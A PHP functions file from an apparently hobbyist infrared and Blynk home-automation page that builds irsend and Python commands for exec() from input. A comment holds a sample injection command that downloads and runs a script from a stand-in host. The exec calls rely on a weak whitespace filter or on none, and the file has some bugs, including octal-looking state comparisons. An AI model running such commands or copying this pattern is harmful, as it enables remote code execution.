<?php
/*
file: functions.php
function: add globally used functions to include for each page
*/
function irsend($device, $key) {
		//terrible attempt to sanitize input
		//check if there are whitespaces in the command
		//idea is that you have to use whitespaces to run other commands
		//reason: irsend SEND_ONCE TV KEY_POWER (normal, uses base command concatenated with variables)
		//hack attempt: irsend SEND_ONCE TV KEY_POWER; wget http://shadysite.com/virus.zip; unzip virus.zip; ./virus.sh
		//has to use whitespaces to differentiate commands
	if (preg_match('/\s/',$device)) {
		die("hack attempt");
	} elseif (preg_match('/\s/',$key)) {
		die("hack attempt");
	} elseif($key == "KEY_VOLUMEUP" || $key == "KEY_VOLUMEDOWN") {
		//if its a stereo, extend the volume control length
		//my stereo is not a digital step volume
		//it just motorizes the front dial; its analog

		exec('irsend SEND_START ' . $device . ' ' . $key);
		usleep(500000);
		exec('irsend SEND_STOP ' . $device . ' '. $key);
	}
	exec('irsend SEND_ONCE ' . $device . ' ' . $key);
}

//Blynk remote control
function blynkWrite($token, $type, $pin, $value){
	exec('python assets/scripts/blynk_ctrl.py -t ' . $token . ' -s 192.168.1.33 -' . $type . 'w ' . $pin . ' ' . $value);
}

function irmacro($macro){
	switch ($macro) {
		case tv:
			$file = fopen("on.txt", "r");
			$on = fread($file,filesize("on.txt"));
			fclose($file);
			
			if($on == 100){
				irsend("STEREO", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "110");
				fclose($file);
			} elseif ($on == 010){
				irsend("TV", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "110");
				fclose($file);
				sleep(10);
			} elseif ($on == 000){
				irsend("TV", "KEY_POWER");
				usleep(50000);
				irsend("STEREO", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "110");
				fclose($file);
				sleep(10);
			} 
			
			irsend ("TV", "KEY_T");
			irsend ("STEREO", "KEY_TAPE");
		break;
		case dvd:
			$file = fopen("on.txt", "r");
			$on = fread($file,filesize("on.txt"));
			fclose($file);
			
			if($on == 100){
				irsend("STEREO", "KEY_POWER");
				irsend("DVD", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "111");
				fclose($file);
			} elseif ($on == 010){
				irsend("TV", "KEY_POWER");
				irsend("DVD", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "111");
				fclose($file);
				sleep(10);
			} elseif ($on == 000){
				irsend("TV", "KEY_POWER");
				usleep(50000);
				irsend("STEREO", "KEY_POWER");
				usleep(5000);
				irsend("DVD", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "111");
				fclose($file);
				sleep(10);
			} elseif ($on == 110){
				irsend("DVD", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "111");
				fclose($file);
			}
			
			irsend ("TV", "KEY_C");
			usleep(1000000);
			irsend ("TV", "KEY_H");
			usleep(5000);
			irsend ("STEREO", "KEY_TAPE");
		break;
		case laptop:
			$file = fopen("on.txt", "r");
			$on = fread($file,filesize("on.txt"));
			fclose($file);
			
			if($on == 100){
				irsend("STEREO", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "110");
				fclose($file);
			} elseif ($on == 010){
				irsend("TV", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "110");
				fclose($file);
				sleep(10);
			} elseif ($on == 000){
				irsend("TV", "KEY_POWER");
				usleep(5000);
				irsend("STEREO", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "110");
				fclose($file);
				sleep(10);
			} 
			irsend ("TV", "KEY_C");
			usleep(1000000);
			irsend ("TV", "KEY_H");
			usleep(1000000);
			irsend ("TV", "KEY_H");
			usleep(5000);
			irsend ("STEREO", "KEY_TAPE");
		break;
		case wii:
			$file = fopen("on.txt", "r");
			$on = fread($file,filesize("on.txt"));
			fclose($file);
			
			if($on == 100){
				irsend("STEREO", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "110");
				fclose($file);
			} elseif ($on == 010){
				irsend("TV", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "110");
				fclose($file);
				sleep(10);
			} elseif ($on == 000){
				irsend("TV", "KEY_POWER");
				usleep(5000);
				irsend("STEREO", "KEY_POWER");
				$file = fopen("on.txt", "w");
				fwrite($file, "110");
				fclose($file);
				sleep(10);
			} 
			
			irsend ("TV", "KEY_C");
			irsend ("STEREO", "KEY_TAPE");
		break;
		case poweroff:
			$file = fopen("on.txt", "r");
			$on = fread($file,filesize("on.txt"));
			if ($on == 111){
				irsend("TV", "KEY_POWER");
				irsend("STEREO", "KEY_POWER");
				irsend("DVD", "KEY_POWER");
			} elseif ($on == 110){
				irsend("TV", "KEY_POWER");
				irsend("STEREO", "KEY_POWER");
			} elseif ($on == 101){
				irsend("TV", "KEY_POWER");
				irsend("DVD", "KEY_POWER");
			} elseif ($on == 100){
				irsend("TV", "KEY_POWER");
			} elseif ($on == 011){
				irsend("STEREO", "KEY_POWER");
				irsend("DVD", "KEY_POWER");
			} elseif ($on == 010){
				irsend("STEREO", "KEY_POWER");
			} elseif ($on == 001){
				irsend("DVD, KEY_POWER");
			} elseif ($on == 000){
			} else {
				die("Well, somthing went wrong");
			}
			fclose($file);
			
			$file = fopen("on.txt", "w");
			fwrite($file, "000");
			fclose($file);
			
		break;
	}
}
?>